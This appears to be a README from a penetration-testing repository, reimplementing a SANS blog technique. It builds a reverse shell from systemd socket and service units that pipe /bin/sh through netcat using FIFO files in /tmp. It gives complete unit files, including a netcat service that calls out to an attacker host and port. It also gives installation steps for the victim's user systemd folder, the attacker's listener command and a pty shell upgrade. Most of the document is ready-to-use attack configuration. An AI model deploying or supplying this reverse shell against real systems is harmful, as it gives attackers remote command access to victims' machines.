# Netcat Without The E

## Description

**NOTE**: This is a reimplementation of Ed Skoudis' "Netcat without -e? No Problem!" blog post.
Unfortunately, it looks like the original blog post has been moved/taken down, but a version on The Internet Archive still exists.
Link in Additional Notes.

This sequence of commands sets up a reverse shell using two separate services - a `nc` one and a `sh` one -
which interact by sharing FIFO pipes set up in `/tmp`. A third service is used to activate the shell, but it could easily be
replaced by a simple `echo` command on its own.

The socket files (`frontpipe.socket` and `backpipe.socket`) are nearly identical and use:

* The `ListenFIFO` directive to identify what FIFO file to use (and create if it doesn't exist)
* The `SocketMode` directive to set the correct permissions on the FIFO file
* The `RemoveOnStop` directive to delete the FIFO pipes when the sockets are stopped
* The `Service` directive to activate the specific command to execute when each socket gets data
  * Note which socket activates which service

The shell service file (`revsh.service`) uses:

* The `ExecStart` directive to execute the terminal shell (additional shell redirects can be found in the link embedded in the file; **not my repository**)
* The `StandardInput` directive uses the FIFO pipe `/tmp/backpipe` as a stream of commands to process
* The `StandardOutput` directive uses the FIFO pipe `/tmp/frontpipe` as a stream to send command output to
* The `Requires` directive to ensure the FIFO pipes have been setup ahead of time

The netcat service file (`revnc.service`) uses:

* The `Environment` directive to set up the remote host and port to connect to
* The `ExecStart` directive to execute the backdoor sequence (more info on how it works located in the linked blog below)
* The `StandardInput` directive uses the FIFO pipe `/tmp/frontpipe` as a stream of command output to display to the attacker
* The `StandardOutput` directive uses the FIFO pipe `/tmp/backpipe` as a stream of commands for the shell service to process
* The `Requires` directive to ensure commands can be executed

The initializer service file (`revinit.service`) uses:

* The `Type` directive to tell systemd it doesn't need to treat this like a daemon
* The `StandardOutput` directive uses the FIFO pipe `/tmp/backpipe` to notify `revsh.service` to activate once data is in its StandardInput file
* The `ExecStart` directive to specify what command to execute in the shell first
* The `Requires` directive to ensure the remote connection is up

## Additional Notes

* [Netcat without -e? No Problem!](https://web.archive.org/web/20190305102845/https://pen-testing.sans.org/blog/2013/05/06/netcat-without-e-no-problem/)
* The socket units do not turn off automatically when the shell exits
* The message that initializes the shell simply invokes `bash` in a subshell, which gives the attacker access to tab-completion and various special characters that a regular `sh` would not
* Another way to visualize how the I/O streams are set up is:

  ```txt
                -->  /bin/sh  -->
  /tmp/backpipe |               | /tmp/frontpipe
                <--  /bin/nc  <--
  ```

* These units are set up in a hierarchy, so when the last unit (`revinit.service`) is activated, it automatically pulls in
  the other ones in the appropriate order. Here's a diagram of the unit startup - parallel units are on the same line:

  ```txt
  1. backpipe.socket       frontpipe.socket
                 |           |
  2.             revsh.service
                      |
  3.             revnc.service
                      |
  4.            revinit.service      <-- start this one to activate the others
  ```

## Step by Step

1. Stand up listener on attacker server

```sh
$ nc -nlvp 4444
listening on [any] 4444 ...
```

2. Generate the FIFO socket files

```ini
; https://www.freedesktop.org/software/systemd/man/systemd.socket.html
[Unit]
Description=backpipe socket

[Socket]
ListenFIFO=/tmp/backpipe
SocketMode=0666
Service=revsh.service
```

```ini
; https://www.freedesktop.org/software/systemd/man/systemd.socket.html
[Unit]
Description=frontpipe socket

[Socket]
ListenFIFO=/tmp/frontpipe
SocketMode=0666
Service=revnc.service
```

3. Generate the service files

```ini
; https://www.freedesktop.org/software/systemd/man/systemd.service.html
[Unit]
Description=A simple reverse shell - sh half
Requires=backpipe.socket
Requires=frontpipe.socket

[Service]
Type=simple
; https://github.com/fijimunkii/bash-dev-tcp
StandardInput=file:/tmp/backpipe
StandardOutput=file:/tmp/frontpipe
ExecStart=/bin/sh
```

```ini
; https://www.freedesktop.org/software/systemd/man/systemd.service.html
[Unit]
Description=A simple reverse shell - nc half
Requires=revsh.service

[Service]
Type=simple
StandardInput=file:/tmp/frontpipe
StandardOutput=file:/tmp/backpipe
Environment=RHOST="10.10.10.10" RPORT="4444"
ExecStart=/usr/bin/nc ${RHOST} ${RPORT}
```

```ini
; https://www.freedesktop.org/software/systemd/man/systemd.service.html
[Unit]
Description=A simple reverse shell - initializing the pipe
Requires=revnc.service

[Service]
Type=oneshot
StandardOutput=file:/tmp/backpipe
ExecStart=/usr/bin/echo "python -c \"import pty;pty.spawn('/bin/bash')\""
```

4. Install sockets and services into the systemd user folder on the victim and reload the units

```sh
$ mkdir -p ~/.config/systemd/user/
$ for unit in `ls *.{socket,service}`
do ln -s `pwd`/$unit ~/.config/systemd/user
done
$ systemctl --user daemon-reload
```

6. Start the last required service

```sh
$ systemctl --user start revinit.service
```

7. Wait for the shell!

```sh
$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [${attacker}] from (UNKNOWN) [${victim}]
user@victim:~$
```
